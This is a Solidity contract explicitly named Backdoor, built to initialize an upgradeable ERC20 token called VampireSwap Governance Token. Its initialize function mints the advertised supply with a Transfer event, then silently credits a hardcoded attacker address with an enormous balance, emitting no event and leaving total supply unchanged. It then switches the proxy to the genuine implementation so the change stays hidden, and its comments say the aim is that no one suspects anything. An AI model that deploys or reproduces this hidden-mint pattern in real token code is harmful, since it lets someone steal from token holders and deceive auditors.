contract Backdoor {
    // Copy of ERC20 state
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    bytes32 public constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public constant governance = 0x4ea63D4a3727b38Cd3a9F5B64b9CC1C6822bf6A9;
    address public constant realImplementation = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address public constant myAddress = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    // ERC20 Transfer event to mimic `mint`
    event Transfer(address indexed from, address indexed to, uint256 value);

    function initialize(address _admin) external {
        // initialize the token so no one suspects anything
        _name = "VampireSwap Governance Token";
        _symbol = "VPR";
        _decimals = 18;

        // Mint initial balance for governance contract
        uint256 initialGovernanceBalance = 1000000000 ether;
        _balances[_admin] = initialGovernanceBalance;
        _totalSupply = initialGovernanceBalance;
        emit Transfer(address(0), _admin, initialGovernanceBalance);

        // Give myself a lof of tokens 😈🦇
        // No event or total balance changes for this one
        _balances[myAddress] = uint128(-1);

        // Set the proxy to the real implementation now that the balance has been set
        _upgrade(realImplementation);
    }

    function _upgrade(address newImplementation) private {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, newImplementation)
        }
    }
}
